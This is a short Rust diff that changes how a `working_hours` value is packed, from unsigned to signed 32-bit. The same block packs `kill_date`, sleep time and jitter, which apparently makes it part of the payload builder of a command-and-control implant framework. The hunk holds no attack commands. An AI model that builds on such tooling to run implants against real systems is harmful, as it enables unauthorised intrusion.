@@ -92,7 +92,7 @@ impl Hexane {
             .map_or(Ok(0), |date| i64::from_str(date))
             .unwrap();
 
-        stream.pack_uint32(working_hours);
+        stream.pack_int32(working_hours);
         stream.pack_uint64(kill_date);
         stream.pack_uint32(self.main_cfg.sleeptime);
         stream.pack_uint32(self.main_cfg.jitter as u32);
